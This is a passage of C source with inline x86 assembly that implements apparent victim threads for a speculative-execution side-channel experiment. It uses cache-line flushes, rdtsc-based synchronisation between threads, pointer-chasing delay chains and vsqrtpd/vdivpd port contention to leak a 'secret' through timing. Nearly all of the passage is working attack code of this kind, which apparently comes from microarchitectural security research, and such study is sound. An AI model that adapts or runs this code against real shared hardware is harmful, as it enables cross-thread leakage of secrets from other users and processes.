	maccess((uint64_t)addr12^0x8000);

	asm volatile("lfence\n");
	maccess(addrA);
	asm volatile("lfence\n");
	maccess(addrB);
	asm volatile("lfence\n");

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	flag = 0;

	while(flag != 7){};

	return flag;
}

volatile unsigned int Cmask = 0;
volatile unsigned int Cbrcond = 10;
volatile unsigned int Cbrcondptr;
volatile unsigned int Cbrcheck = 20;
volatile unsigned int brcheck = 20;
volatile unsigned int Csecret = 0;

void* contentionX_victim_thread(void)
{
	volatile unsigned int *br = &Cbrcond;
	volatile unsigned int *cn = &Cbrcheck;
  volatile unsigned int *s = &Csecret;
  
	void *addr1 = attackerAddr[0];
	void *addr2 = attackerAddr[1];
	void *addr3 = attackerAddr[2];
	void *addr4 = attackerAddr[3];
	void *addr5 = attackerAddr[4];
	void *addr6 = attackerAddr[5];
	void *addr7 = attackerAddr[6];
	void *addr8 = attackerAddr[7];
	void *addr9 = attackerAddr[8];
	void *addr10 = attackerAddr[9];
	void *addr11 = attackerAddr[10];
	void *addr12 = attackerAddr[11];
	void *addr13 = attackerAddr[12];
	void *addr14 = attackerAddr[13];
	void *addr15 = attackerAddr[14];
	void *addr16 = attackerAddr[15];
	void *addr17 = attackerAddr[16];
	void *addr18 = attackerAddr[17];
	void *addr19 = attackerAddr[18];
	void *addr20 = attackerAddr[19];
	void *addr21 = attackerAddr[20];
	void *addr22 = attackerAddr[21];
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	unsigned int cycle;
 	volatile unsigned int *t = &ticks;
  
	setaffinity(VIC);
	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7);
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);
	_mm_clflush(addrA);
	_mm_clflush(addrB);
	_mm_clflush(addr12);
	_mm_clflush(addr13);
	_mm_clflush(addr14);
	_mm_clflush(addr15);
	_mm_clflush(addr16);
	_mm_clflush(addr17);
	_mm_clflush(addr18);
	_mm_clflush(addr19);
	_mm_clflush(addr20);
	_mm_clflush(addr21);
	_mm_clflush(addr22);
 
 	_mm_clflush(bppppp);
  _mm_clflush(bpppp);
  _mm_clflush(bppp);
  _mm_clflush(bpp);
 	_mm_clflush(bp);
  
	uint32_t lo1,hi1,lo2,hi2;
	uint64_t time1,time2,timet1,timet2;
	uint32_t temp;

	uint64_t time2s[SAMPLES];
	uint64_t diffs[SAMPLES];

	uint64_t start_interval[SAMPLES];
	uint64_t first_time[SAMPLES];
	uint64_t second_time[SAMPLES];

	// Synchronize

	uint64_t start;
	uint64_t sync;
	do {
		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}
	while((start >> 29) & 0x1);

	sync = ((start + (0x1 << 30)) >> 30) << 30;
	//printf("[1] start:%lld  check:%lld\n", start, sync);

	while((start >> 30) != (sync >> 30)) {
    		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}  
	sync = start;
	//printf("[2] Sync: %llx\n", start);


	while(flag != 1){};

	asm volatile("lfence\n");


	asm(
 	R"(
  
	lfence
	lfence
	lfence
  vzeroall

	vmovdqa (%2), %%ymm0
	

	mov (%1), %%rbx
  clflush (%1)
	mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
	.REPT	1024
		NOP
	.ENDR
 
  mov %4, %%rcx
	lfence
  movl (%%rcx), %%r12d 
	lfence
 
	mov (%1), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
 
	mov %%ebx, %%eax
	movl (%%rcx,%%rax,1), %%r8d	
 
.REPT   40 #HERE2
        vsqrtpd %%ymm1,%%ymm1
.ENDR
  vmovq %%xmm1, %%rax
	movl (%0,%%rax,1), %%ebx

	lfence
	lfence
	lfence
 
 	sub %%r12d, %%r8d
  movl %%r8d, %3

)"
        : "+r"(addrA), "+r"(bppppp), "+r"(indicies), "=r"(cycle), "+r"(t)
        : 
        : "%r12", "%r13", "%eax", "%ebx", "%ecx", "%edx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
);




	asm volatile("lfence\n");

	flag = 0;

	while(flag != 7){};

	return cycle;
}



void* contentionfixed_victim_thread12(unsigned int hdis)
{
    volatile unsigned int *s = &secret;
    volatile unsigned int **b = &brcondptr;
    volatile unsigned int *m = &mask;
    unsigned int *check = &bcheck;
    unsigned int *chess = &chessboard;
   
	void *addr1 = attackerAddr[0];
	void *addr2 = attackerAddr[1];
	void *addr3 = attackerAddr[2];
	void *addr4 = attackerAddr[3];
	void *addr5 = attackerAddr[4];
	void *addr6 = attackerAddr[5];
	void *addr7 = attackerAddr[6];
	void *addr8 = attackerAddr[7];
	void *addr9 = attackerAddr[8];
	void *addr10 = attackerAddr[9];
	void *addr11 = attackerAddr[10];
	void *addr12 = attackerAddr[11];
	void *addr13 = attackerAddr[12];
	void *addr14 = attackerAddr[13];
	void *addr15 = attackerAddr[14];
	void *addr16 = attackerAddr[15];
	void *addr17 = attackerAddr[16];
	void *addr18 = attackerAddr[17];
	void *addr19 = attackerAddr[18];
	void *addr20 = attackerAddr[19];
	void *addr21 = attackerAddr[20];
	void *addr22 = attackerAddr[21];	
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	unsigned int cycle;
 	volatile unsigned int *t = &ticks;
  
	setaffinity(VIC);
	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7);
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);
	
	_mm_clflush(addrA);
	_mm_clflush(addrB);


	_mm_clflush(addr12);
	_mm_clflush(addr13);	
	_mm_clflush(addr14);
	_mm_clflush(addr15);
	_mm_clflush(addr16);
	_mm_clflush(addr17);
	_mm_clflush(addr18);
	_mm_clflush(addr19);
	_mm_clflush(addr20);
	_mm_clflush(addr21);
	_mm_clflush(addr22);
	
 
    _mm_clflush(bppppp);
    _mm_clflush(bpppp);
    _mm_clflush(bppp);
    _mm_clflush(bpp);
    _mm_clflush(bp);
  
	uint32_t lo1,hi1,lo2,hi2;
	uint64_t time1,time2,timet1,timet2;
	uint32_t temp;

	uint64_t time2s[SAMPLES];
	uint64_t diffs[SAMPLES];

	uint64_t start_interval[SAMPLES];
	uint64_t first_time[SAMPLES];
	uint64_t second_time[SAMPLES];

	// Synchronize

//	flag = 3;
//  while(flag == 3) {};

 while(syncflag != 1){};
 syncflag = 2;
  
	uint64_t start;
	uint64_t sync;
	do {
		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}
	while((start >> 19) & 0x1);

	sync = ((start + (0x1 << 20)) >> 20) << 20;
	//printf("[1] start:%lld  check:%lld\n", start, sync);

	while((start >> 20) != (sync >> 20)) {
    		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}  
	sync = start;
	//printf("[2] Sync: %llx\n", start);


	while(flag != 1){};



	asm volatile("lfence\n");

    brcond = hdis;
    cycle = asm_contention();


	asm volatile("lfence\n");
    /*unsigned int lob,hib;
    __asm__ __volatile__ ("rdtsc" : "=a" (lob), "=d" (hib));
    printf("\n\n TIME2 = %lld\n\n", ((uint64_t)hib << 32) | lob);
    fflush(stdout);*/
	flag = 0;

	while(flag != 7){};

	return cycle;
}

void* contentionfixed_victim_thread(void)
{
	volatile unsigned int *s = &secret;
	volatile unsigned int **b = &brcondptr;
	volatile unsigned int *m = &mask;
	unsigned int *check = &bcheck;
  unsigned int *chess = &chessboard;
   
	void *addr1 = attackerAddr[0];
	void *addr2 = attackerAddr[1];
	void *addr3 = attackerAddr[2];
	void *addr4 = attackerAddr[3];
	void *addr5 = attackerAddr[4];
	void *addr6 = attackerAddr[5];
	void *addr7 = attackerAddr[6];
	void *addr8 = attackerAddr[7];
	void *addr9 = attackerAddr[8];
	void *addr10 = attackerAddr[9];
	void *addr11 = attackerAddr[10];
	void *addr12 = attackerAddr[11];
	void *addr13 = attackerAddr[12];
	void *addr14 = attackerAddr[13];
	void *addr15 = attackerAddr[14];
	void *addr16 = attackerAddr[15];
	void *addr17 = attackerAddr[16];
	void *addr18 = attackerAddr[17];
	void *addr19 = attackerAddr[18];
	void *addr20 = attackerAddr[19];
	void *addr21 = attackerAddr[20];
	void *addr22 = attackerAddr[21];
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	unsigned int cycle;
 	volatile unsigned int *t = &ticks;
  
	setaffinity(VIC);
	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7);
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);
	_mm_clflush(addrA);
	_mm_clflush(addrB);
	_mm_clflush(addr12);
	_mm_clflush(addr13);
	_mm_clflush(addr14);
	_mm_clflush(addr15);
	_mm_clflush(addr16);
	_mm_clflush(addr17);
	_mm_clflush(addr18);
	_mm_clflush(addr19);
	_mm_clflush(addr20);
	_mm_clflush(addr21);
	_mm_clflush(addr22);
 
 	_mm_clflush(bppppp);
  _mm_clflush(bpppp);
  _mm_clflush(bppp);
  _mm_clflush(bpp);
 	_mm_clflush(bp);
  
	uint32_t lo1,hi1,lo2,hi2;
	uint64_t time1,time2,timet1,timet2;
	uint32_t temp;

	uint64_t time2s[SAMPLES];
	uint64_t diffs[SAMPLES];

	uint64_t start_interval[SAMPLES];
	uint64_t first_time[SAMPLES];
	uint64_t second_time[SAMPLES];

	// Synchronize

//	flag = 3;
//  while(flag == 3) {};

	uint64_t start;
	uint64_t sync;
	do {
		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}
	while((start >> 19) & 0x1);

	sync = ((start + (0x1 << 20)) >> 20) << 20;
	//printf("[1] start:%lld  check:%lld\n", start, sync);

	while((start >> 20) != (sync >> 20)) {
    		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}  
	sync = start;
	//printf("[2] Sync: %llx\n", start);


	while(flag != 1){};

for(int i = 0; i < 1000; i++){
	asm volatile("lfence\n");


	asm(
	R"(
 
	mov %3, %%rdx
	movl (%%rdx), %%eax
  mov (%7), %%rbx
  clflush 64(%7)
  
	vzeroall
	lfence
	lfence
	lfence
	movl (%5), %%r11d
	movl (%6), %%r12d
	mov %4, %%r8
	mov %3, %%rdx

  mov (%1), %%rbx
  clflush (%1)
  mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
  mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
  mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx

	.REPT	1024
		NOP
	.ENDR

	clflush (%%r8)	

  lfence

	mov (%1), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx

	.REPT   42  #CHAIN_ITER	
		vsqrtpd %%ymm1,%%ymm1
	.ENDR
	vmovq %%xmm1, %%rax
	movl (%0,%%rax,1), %%ecx


	mov (%%r8), %%rbx
	mov (%%rbx), %%rax
	cmp %%eax, %%r11d
	jle donef


 
	movl (%%rdx), %%eax
	movl (%7,%%rax,8), %%eax
  vmovq %%rax, %%xmm2
  
	.REPT	8
		vsqrtpd %%ymm2,%%ymm3
		vsqrtpd %%ymm2,%%ymm4
		vsqrtpd %%ymm2,%%ymm5
		vsqrtpd %%ymm2,%%ymm6
		vsqrtpd %%ymm2,%%ymm7
		vsqrtpd %%ymm2,%%ymm8
		vsqrtpd %%ymm2,%%ymm9
		vsqrtpd %%ymm2,%%ymm10
		vsqrtpd %%ymm2,%%ymm11
		vsqrtpd %%ymm2,%%ymm12
		vsqrtpd %%ymm2,%%ymm13
		vsqrtpd %%ymm2,%%ymm14
		vsqrtpd %%ymm2,%%ymm15 
	.ENDR	


	donef:	movl %%ecx, %2
			clflush (%4)
			clflush (%%rbx)
	)"
        : "+r"(addrA), "+r"(bppppp), "=r"(cycle), "+r"(s), "+r"(b), "+r"(check), "+r"(m), "+r"(chess)
        : 
        : "%r11", "%r12", "%rax", "%rbx", "%rcx", "%r8", "%rdx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
	);

}


	asm volatile("lfence\n");
    /*unsigned int lob,hib;
    __asm__ __volatile__ ("rdtsc" : "=a" (lob), "=d" (hib));
    printf("\n\n TIME2 = %lld\n\n", ((uint64_t)hib << 32) | lob);
    fflush(stdout);*/
	flag = 0;

	while(flag != 7){};

	return cycle;
}

unsigned int __attribute__ ((aligned (1024))) arrayC[8] = {0,1,2,3,4,5,6,7};
double __attribute__ ((aligned (1024))) val_arrayC[4] = {1.0,2.0,3.0,5.0};


void* no_contention_victim_threadAB(void)
{
	volatile unsigned int *br = &brcond;
	volatile unsigned int *cn = &brcheck;
  volatile unsigned int *s = &secret;
	void *addr1 = attackerAddr[0];
	void *addr2 = attackerAddr[1];
	void *addr3 = attackerAddr[2];
	void *addr4 = attackerAddr[3];
	void *addr5 = attackerAddr[4];
	void *addr6 = attackerAddr[5];
	void *addr7 = attackerAddr[6];
	void *addr8 = attackerAddr[7];
	void *addr9 = attackerAddr[8];
	void *addr10 = attackerAddr[9];
	void *addr11 = attackerAddr[10];
	void *addr12 = attackerAddr[11];
	void *addr13 = attackerAddr[12];
	void *addr14 = attackerAddr[13];
	void *addr15 = attackerAddr[14];
	void *addr16 = attackerAddr[15];
	void *addr17 = attackerAddr[16];
	void *addr18 = attackerAddr[17];
	void *addr19 = attackerAddr[18];
	void *addr20 = attackerAddr[19];
	void *addr21 = attackerAddr[20];
	void *addr22 = attackerAddr[21];
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];
	unsigned int *indicies = &array[0];
	double *values = &val_arrayC[0];
	unsigned int cycle;
 	volatile unsigned int *t = &ticks;
  
  //printf("POINT %p\n", values);
  //fflush(stdout);
	setaffinity(VIC);
	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7);
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);
	_mm_clflush(addrA);
	_mm_clflush(addrB);
	_mm_clflush(addr12);
	_mm_clflush(addr13);
	_mm_clflush(addr14);
	_mm_clflush(addr15);
	_mm_clflush(addr16);
	_mm_clflush(addr17);
	_mm_clflush(addr18);
	_mm_clflush(addr19);
	_mm_clflush(addr20);
	_mm_clflush(addr21);
	_mm_clflush(addr22);
 
 	_mm_clflush(bppppp);
  _mm_clflush(bpppp);
  _mm_clflush(bppp);
  _mm_clflush(bpp);
 	_mm_clflush(bp);
  
	uint32_t lo1,hi1,lo2,hi2;
	uint64_t time1,time2,timet1,timet2;
	uint32_t temp;

	uint64_t time2s[SAMPLES];
	uint64_t diffs[SAMPLES];

	uint64_t start_interval[SAMPLES];
	uint64_t first_time[SAMPLES];
	uint64_t second_time[SAMPLES];

	// Synchronize

	uint64_t start;
	uint64_t sync;
	do {
		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}
	while((start >> 29) & 0x1);

	sync = ((start + (0x1 << 30)) >> 30) << 30;
	//printf("[1] start:%lld  check:%lld\n", start, sync);

	while((start >> 30) != (sync >> 30)) {
    		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}  
	sync = start;
	//printf("[2] Sync: %llx\n", start);


/*const unsigned char data[16] = {0xFF, 0x00, 0x01, 0xFF,0xFF, 0x00, 0x01, 0xFF,0xFF, 0x00, 0x01, 0xFF,0xFF, 0x00, 0x01, 0xFF};
__m128i xmm0;
const float hiaddr[4] = {1.0, 2.0, 3.0, 4.0};
const float loaddr[4] = {1.0, 2.0, 3.0, 4.0};

xmm0 = _mm_loadu_si128((__m128i *)data); 

const unsigned char data1[32] = {0xFF, 0x00, 0x01, 0xFF,0xFF, 0x00, 0x01, 0xFF,0xFF, 0x00, 0x01, 0xFF,0xFF, 0x00, 0x01, 0xFF, 0xFF, 0x00, 0x01, 0xFF,0xFF, 0x00, 0x01, 0xFF,0xFF, 0x00, 0x01, 0xFF,0xFF, 0x00, 0x01, 0xFF};
__m256i ymm0;*/

//ymm0 = _mm256_loadu_si256((__m256i *)data1); 
//ymm0 = _mm256_loadu2_m128 ((float const*) hiaddr, (float const*) loaddr);

	while(flag != 1){};

	asm volatile("lfence\n");

  support_asm_fn();
  //printf("SAFE");
  fflush(stdout);

	asm(
 	R"(
  
	lfence
	lfence
	lfence


	

	mov (%1), %%rbx
  clflush (%1)
	mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
	.REPT	1024
		NOP
	.ENDR
 
  mov %4, %%rcx
	lfence
  movl (%%rcx), %%r12d 
	lfence
 
	mov (%1), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
 
	mov %%ebx, %%eax
	movl (%%rcx,%%rax,1), %%r8d	
 
.REPT   44 #HERE1
        vdivpd %%ymm15,%%ymm0,%%ymm0
.ENDR
  vsubpd %%ymm0, %%ymm0, %%ymm0
  vmovq %%xmm0, %%rax
	movl (%0,%%rax,1), %%ebx

	lfence
	lfence
	lfence
 
 	sub %%r12d, %%r8d
  movl %%r8d, %3

)"
        : "+r"(addrA), "+r"(bppppp), "=r"(indicies), "=r"(cycle), "+r"(t)
        : 
        : "%r12", "%r13", "%eax", "%ebx", "%ecx", "%edx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
);




	asm volatile("lfence\n");

	flag = 0;

	while(flag != 7){};

	return cycle;
}

void* victim_threadBA(void)
{
	void *addr1 = attackerAddr[0];
	void *addr2 = attackerAddr[1];
	void *addr3 = attackerAddr[2];
	void *addr4 = attackerAddr[3];
	void *addr5 = attackerAddr[4];
	void *addr6 = attackerAddr[5];
	void *addr7 = attackerAddr[6];
	void *addr8 = attackerAddr[7];
	void *addr9 = attackerAddr[8];
	void *addr10 = attackerAddr[9];
	void *addr11 = attackerAddr[10];
	void *addr12 = attackerAddr[11];
	void *addr13 = attackerAddr[12];
	void *addr14 = attackerAddr[13];
	void *addr15 = attackerAddr[14];
	void *addr16 = attackerAddr[15];
	void *addr17 = attackerAddr[16];
	void *addr18 = attackerAddr[17];
	void *addr19 = attackerAddr[18];
	void *addr20 = attackerAddr[19];
	void *addr21 = attackerAddr[20];
	void *addr22 = attackerAddr[21];
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];

	setaffinity(VIC);
	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7);
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);
	_mm_clflush(addrA);
	_mm_clflush(addrB);
	_mm_clflush(addr12);
	_mm_clflush(addr13);
	_mm_clflush(addr14);
	_mm_clflush(addr15);
	_mm_clflush(addr16);
	_mm_clflush(addr17);
	_mm_clflush(addr18);
	_mm_clflush(addr19);
	_mm_clflush(addr20);
	_mm_clflush(addr21);
	_mm_clflush(addr22);
	uint32_t lo1,hi1,lo2,hi2;
	uint64_t time1,time2,timet1,timet2;
	uint32_t temp;

	uint64_t time2s[SAMPLES];
	uint64_t diffs[SAMPLES];

	uint64_t start_interval[SAMPLES];
	uint64_t first_time[SAMPLES];
	uint64_t second_time[SAMPLES];

	// Synchronize

	uint64_t start;
	uint64_t sync;
	do {
		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}
	while((start >> 19) & 0x1);

	sync = ((start + (0x1 << 20)) >> 20) << 20;
	//printf("[1] start:%lld  check:%lld\n", start, sync);

	while((start >> 20) != (sync >> 20)) {
    		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}  
	sync = start;
	//printf("[2] Sync: %llx\n", start);



	while(flag != 1){};
	
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	asm volatile("lfence\n");
	maccess(addrB);
	asm volatile("lfence\n");
	maccess(addrA);
	asm volatile("lfence\n");

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	flag = 0;

	while(flag != 7){};

	return flag;
}

void* contention_victim_threadBA(void)
{
	void *addr1 = attackerAddr[0];
	void *addr2 = attackerAddr[1];
	void *addr3 = attackerAddr[2];
	void *addr4 = attackerAddr[3];
	void *addr5 = attackerAddr[4];
	void *addr6 = attackerAddr[5];
	void *addr7 = attackerAddr[6];
	void *addr8 = attackerAddr[7];
	void *addr9 = attackerAddr[8];
	void *addr10 = attackerAddr[9];
	void *addr11 = attackerAddr[10];
	void *addr12 = attackerAddr[11];
	void *addr13 = attackerAddr[12];
	void *addr14 = attackerAddr[13];
	void *addr15 = attackerAddr[14];
	void *addr16 = attackerAddr[15];
	void *addr17 = attackerAddr[16];
	void *addr18 = attackerAddr[17];
	void *addr19 = attackerAddr[18];
	void *addr20 = attackerAddr[19];
	void *addr21 = attackerAddr[20];
	void *addr22 = attackerAddr[21];
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	unsigned int cycle;
 	volatile unsigned int *t = &ticks;
  
	setaffinity(VIC);
	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7);
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);
	_mm_clflush(addrA);
	_mm_clflush(addrB);
	_mm_clflush(addr12);
	_mm_clflush(addr13);
	_mm_clflush(addr14);
	_mm_clflush(addr15);
	_mm_clflush(addr16);
	_mm_clflush(addr17);
	_mm_clflush(addr18);
	_mm_clflush(addr19);
	_mm_clflush(addr20);
	_mm_clflush(addr21);
	_mm_clflush(addr22);
 
  _mm_clflush(bppppp);
  _mm_clflush(bpppp);
  _mm_clflush(bppp);
  _mm_clflush(bpp);
 	_mm_clflush(bp);
  
  
	uint32_t lo1,hi1,lo2,hi2;
	uint64_t time1,time2,timet1,timet2;
	uint32_t temp;

	uint64_t time2s[SAMPLES];
	uint64_t diffs[SAMPLES];

	uint64_t start_interval[SAMPLES];
	uint64_t first_time[SAMPLES];
	uint64_t second_time[SAMPLES];

	// Synchronize

	uint64_t start;
	uint64_t sync;
	do {
		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}
	while((start >> 29) & 0x1);

	sync = ((start + (0x1 << 30)) >> 30) << 30;
	//printf("[1] start:%lld  check:%lld\n", start, sync);

	while((start >> 30) != (sync >> 30)) {
    		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}  
	sync = start;
	//printf("[2] Sync: %llx\n", start);



	while(flag != 1){};
	
	asm volatile("lfence\n");
	
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);

	asm volatile("lfence\n");
 
  support_asm_fn();
  //printf("SAFE");
  fflush(stdout);

	asm(
 	R"(
  
	lfence
	lfence
	lfence


	

	mov (%1), %%rbx
  clflush (%1)
	mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
	.REPT	1024
		NOP
	.ENDR
 
  mov %4, %%rcx
	lfence
  movl (%%rcx), %%r12d 
	lfence
 
	mov (%1), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
 
	mov %%ebx, %%eax
	movl (%%rcx,%%rax,1), %%r8d	
 
.REPT   44 #HEREO
        vdivpd %%ymm15,%%ymm0,%%ymm0
.ENDR
  vsubpd %%ymm0, %%ymm0, %%ymm0
  vmovq %%xmm0, %%rax
	movl (%0,%%rax,1), %%ebx

.REPT	8
        vsqrtpd %%ymm2,%%ymm2
        vsqrtpd %%ymm3,%%ymm3
        vsqrtpd %%ymm4,%%ymm4
        vsqrtpd %%ymm5,%%ymm5
        vsqrtpd %%ymm6,%%ymm6
        vsqrtpd %%ymm7,%%ymm7
        vsqrtpd %%ymm8,%%ymm8
        vsqrtpd %%ymm9,%%ymm9
        vsqrtpd %%ymm10,%%ymm10
        vsqrtpd %%ymm11,%%ymm11
        vsqrtpd %%ymm12,%%ymm12
        vsqrtpd %%ymm13,%%ymm13
        vsqrtpd %%ymm14,%%ymm14
        vsqrtpd %%ymm15,%%ymm15 
.ENDR

	lfence
	lfence
	lfence
 
 	sub %%r12d, %%r8d
  movl %%r8d, %3

)"
        : "+r"(addrA), "+r"(bppppp), "+r"(indicies), "=r"(cycle), "+r"(t)
        : 
        : "%r12", "%r13", "%eax", "%ebx", "%ecx", "%edx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
);

	asm volatile("lfence\n");
	
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);

	asm volatile("lfence\n");	

	flag = 0;

	while(flag != 7){};

	return cycle;
}

